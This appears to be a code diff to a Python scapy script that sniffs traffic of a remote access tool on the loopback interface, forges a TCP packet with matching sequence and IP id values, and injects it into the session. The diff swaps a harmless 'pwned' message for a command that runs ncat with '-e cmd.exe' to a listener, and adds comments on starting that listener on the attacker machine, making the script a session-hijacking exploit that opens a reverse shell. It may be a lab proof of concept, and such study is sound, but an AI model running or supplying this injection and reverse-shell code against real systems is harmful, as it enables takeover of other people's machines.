@@ -1,9 +1,10 @@
-import scapy.layers.l2
-from scapy.all import sniff, send, raw
-from scapy.layers.inet import IP, TCP, ICMP
-import dataclasses
+from scapy.all import sniff, send
+from scapy.layers.inet import IP, TCP
 import struct
-from time import sleep
+
+# run a netcat server on attacker machine first
+# ncat -nvlp 8000
+command = "\"C:\\Program Files (x86)\\Nmap\\ncat.exe\" localhost 8000 -e cmd.exe"
 
 class RATStream:
     admin_port: int = -1
@@ -13,7 +14,7 @@ class RATStream:
     most_recent_ip_id: int = -1
     template_packet = None
 
-    def poison_and_send(self):
+    def poison_and_inject(self):
         new_packet = self.template_packet.copy()
 
         new_packet[IP].id = self.most_recent_ip_id + 1
@@ -24,7 +25,8 @@ class RATStream:
         tcp_layer.seq = ratstream.most_recent_remote_ack
         tcp_layer.chksum = None
 
-        new_packet[TCP].payload.load = struct.pack("I 2044s", 1, 'youve been pwned!'.encode())
+        global command
+        new_packet[TCP].payload.load = struct.pack("I 2044s", 6, command.encode())
 
         send(new_packet[IP], iface='\\Device\\NPF_Loopback')
 
@@ -33,9 +35,8 @@ def decode_message_packet(packet):
 
 waiting_for_ack = False
 ratstream = RATStream()
-def process_packet(packet: scapy.layers.l2.Loopback):
+def process_packet(packet):
     global waiting_for_ack, ratstream
-
 
     if packet.haslayer(TCP):
         if len(packet[TCP].payload) == 2048:
@@ -53,7 +54,7 @@ def process_packet(packet: scapy.layers.l2.Loopback):
             ratstream.most_recent_ip_id = packet[IP].id
 
             if waiting_for_ack:
-                ratstream.poison_and_send()
+                ratstream.poison_and_inject()
                 waiting_for_ack = False
 
 print("Sniffing and detecting RAT packets...")
